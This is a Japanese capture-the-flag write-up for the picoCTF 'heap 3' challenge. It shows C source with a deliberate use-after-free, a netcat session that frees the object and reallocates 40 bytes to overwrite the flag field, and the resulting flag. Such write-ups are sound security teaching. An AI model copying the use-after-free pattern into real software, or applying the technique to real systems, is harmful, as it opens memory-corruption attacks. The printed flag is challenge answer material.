# heap 3:Binary Exploitation:200pts
This program mishandles memory. Can you exploit it to get the flag?  
Download the binary [here](chall).  
Download the source [here](chall.c).  
Connect with the challenge instance here:  
`nc tethys.picoctf.net 63226`  

Hints  
Check out "use after free"  

# Solution
バイナリ、ソースと接続先が渡される。  
ソースは以下の通りであった。  
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x->flag, x->flag);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
Check for winで簡単に`check_win`は呼び出せるが、`x->flag`が文字列`pico`と一致する必要がある。  
`x->flag`は`init`で文字列`bico`に設定されている。  
また、Allocate objectで任意のサイズを`malloc`してデータを書き込む、Free xで`x`を`free`する機能がある。  
ただし、`malloc`は`x`とは別の位置にメモリを確保するため、`x`を書き換えることはできない。  
ここで、`x`がグローバルに定義されており、`free`などの操作を行っても`check_win`からアクセスできることに気づく。  
つまり、一度`x`を`free`し、同じチャンクサイズとなる0x28までを`malloc`するとtcachebinsにある元の`x`の領域を再度取得し書き換えることができる。  
以下のように、うまく`x->flag`の場所を書き換える。  
```bash
$ nc tethys.picoctf.net 63226

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 40
Data for flag: SATOKISATOKISATOKISATOKISATOKIpico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = pico


1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
picoCTF{now_thats_free_real_estate_a7381726}
```
Check for winでflagが得られた。  

## picoCTF{now_thats_free_real_estate_a7381726}